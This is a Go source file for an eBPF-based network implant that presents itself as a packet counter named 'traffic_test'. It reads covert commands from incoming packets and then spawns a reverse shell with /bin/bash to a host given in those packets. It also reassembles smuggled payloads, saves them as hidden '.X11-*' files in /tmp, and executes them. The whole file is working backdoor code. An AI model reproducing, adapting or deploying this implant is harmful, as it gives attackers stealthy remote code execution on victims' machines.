package main

import (
	"encoding/binary"
	"errors"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"time"

	"github.com/cilium/ebpf"
	"github.com/cilium/ebpf/link"
)

//go:generate go tool bpf2go -tags linux traffic_test ebpf/traffic-test.c

type Data struct {
	host     net.IP
	port     uint32
	data     []byte
	done     bool
	save     bool
	filename string
	exec     bool
}

var verbose *bool

var conns map[string]bool = make(map[string]bool)

var datas map[string]Data = make(map[string]Data)

func displayCounter(objs traffic_testObjects) {
	var count traffic_testTrafficOperation
	err := objs.TrafficOps.Lookup(uint32(0), &count)
	if err != nil {
		log.Fatal("(count) Map lookup:", err)
	}
	if *verbose {
		log.Printf("Received %d packets", count.Offset)
	}
}

func int2ip(nn uint32) net.IP {
	ip := make(net.IP, 4)
	binary.BigEndian.PutUint32(ip, nn)
	return ip
}

func getRevshell(objs traffic_testObjects) {
	var rev traffic_testTrafficOperation
	err := objs.TrafficOps.Lookup(uint32(1), &rev)
	if err != nil {
		log.Fatal("(revshell) Map lookup:", err)
	}
	if rev.Host != 0 && rev.Port != 0 {
		host := int2ip(rev.Host)
		connstr := host.String() + ":" + fmt.Sprintf("%d", rev.Port)
		if conns[connstr] {
			return
		}
		conns[connstr] = true
		fmt.Println("Spawning revshell to " + connstr)
		go func() {
			c, _ := net.Dial("tcp", connstr)
			cmd := exec.Command("/bin/bash")
			cmd.Stdin = c
			cmd.Stdout = c
			cmd.Stderr = c
			err := cmd.Run()
			if err != nil {
				fmt.Printf("[ERROR] Fail in revshell for '%s': %s\n", connstr, err)
			}
			conns[connstr] = false
		}()
	}
}

func performPostDataActions(data Data) {

	if !data.done {
		return
	}

	if !data.save && data.exec {
		execShellcode(data.data)
	}

	if data.save {
		fp, err := os.CreateTemp("/tmp", ".X11-*")
		if err != nil {
			log.Fatalf("[DATA-CREATE] exec+save: %s", err)
		}
		fp.Write(data.data)
		fp.Close()

		fmt.Printf("[SAVE] Data from '%s' saved to '%s'\n", data.host.String(), fp.Name())

		if data.exec {
			err = os.Chmod(fp.Name(), os.FileMode(0700))
			if err != nil {
				log.Fatalf("[FILE-CHMOD] exec+save: %s", err)
			}
			if _, err := os.Stat(fp.Name()); errors.Is(err, os.ErrNotExist) {
				log.Fatalf("[FILE-EXISTS] exec+save: %s", err)
			}
			go func() {
				fmt.Printf("[SAVE] Executing \"/bin/sh -c '%s'\"\n", fp.Name())
				cmd := exec.Command("/bin/sh", "-c", fp.Name())
				err := cmd.Run()
				if err != nil {
					fmt.Printf("[ERROR] Fail in DATA save+exec for '%s': %s\n", data.host.String(), err)
				}
			}()
		}

	}
}

func parseDataAttrs(data Data) Data {
	switch data.port {
	case 1:
		data.done = true
	case 2:
		data.exec = true
	case 3:
		data.save = true
	}
	return data
}

func getData(objs traffic_testObjects) {
	var data_obj traffic_testTrafficOperation
	var data Data
	err := objs.TrafficOps.Lookup(uint32(2), &data_obj)
	if err != nil {
		log.Fatal("(data) Map lookup: ", err)
	}

	if *verbose {
		fmt.Printf("Got data obj: %+v\n", data_obj)
	}

	if data_obj.Data != 0 {
		if data_obj.Offset == 0 {
			data_bytes := make([]byte, 4)
			binary.BigEndian.PutUint32(data_bytes, data_obj.Data)
			data = Data{
				host:     int2ip(data_obj.Host),
				port:     data_obj.Port,
				data:     data_bytes,
				done:     false,
				save:     false,
				filename: "",
				exec:     false,
			}
			data = parseDataAttrs(data)
			if *verbose {
				fmt.Printf("Got new data packet from '%s': %+v\n'", data.host.String(), data)
			}
			if data.done {
				performPostDataActions(data)
			} else {
				datas[data.host.String()] = data
			}
		} else if data_obj.Offset > 0 {
			host := int2ip(data_obj.Host).String()
			if data, exists := datas[host]; exists {
				if data_obj.Offset == uint32(len(data.data)-4) {
					if *verbose {
						fmt.Println("Offsets match: already have this packet! Continuing...")
					}
				} else {
					data.port = data_obj.Port
					data_bytes := make([]byte, 4)
					binary.BigEndian.PutUint32(data_bytes, data_obj.Data)
					data.data = append(data.data, data_bytes...)
					data = parseDataAttrs(data)
					if *verbose {
						fmt.Printf("Got existing data packet from '%s': %+v\n'", data.host.String(), data)
					}
					if data.done {
						performPostDataActions(data)
						delete(datas, data.host.String())
					} else {
						datas[data.host.String()] = data
					}
				}
			}
		}

	}
}

func main() {

	verbose = flag.Bool("v", false, "enable verbose output")
	flag.Parse()

	// Positional arguments
	args := flag.Args()

	if len(args) < 1 {
		fmt.Fprintf(os.Stderr, "usage: %s iface [-v]\n", os.Args[0])
		os.Exit(1)
	}

	ifaceName := args[0]

	// Look up the network interface by name.
	iface, err := net.InterfaceByName(ifaceName)
	if err != nil {
		log.Fatalf("lookup network iface %q: %s", ifaceName, err)
	}

	// Load pre-compiled programs into the kernel.
	objs := traffic_testObjects{}
	if err := loadTraffic_testObjects(&objs, nil); err != nil {
		log.Fatalf("loading objects: %s", err)
	}
	defer objs.Close()

	// Attach the program to Ingress TC.
	l, err := link.AttachTCX(link.TCXOptions{
		Interface: iface.Index,
		Program:   objs.ClassifierIngress,
		Attach:    ebpf.AttachTCXIngress,
	})
	if err != nil {
		log.Fatalf("could not attach TCx program: %s", err)
	}
	defer l.Close()

	log.Printf("Counting incoming packets on %s..", ifaceName)

	// Periodically fetch the packet counter from PktCount,
	// exit the program when interrupted.
	tick := time.Tick(time.Second)
	stop := make(chan os.Signal, 5)
	signal.Notify(stop, os.Interrupt)
	for {
		select {
		case <-tick:
			displayCounter(objs)
			getRevshell(objs)
			getData(objs)
		case <-stop:
			log.Print("Received signal, exiting..")
			return
		}
	}
}
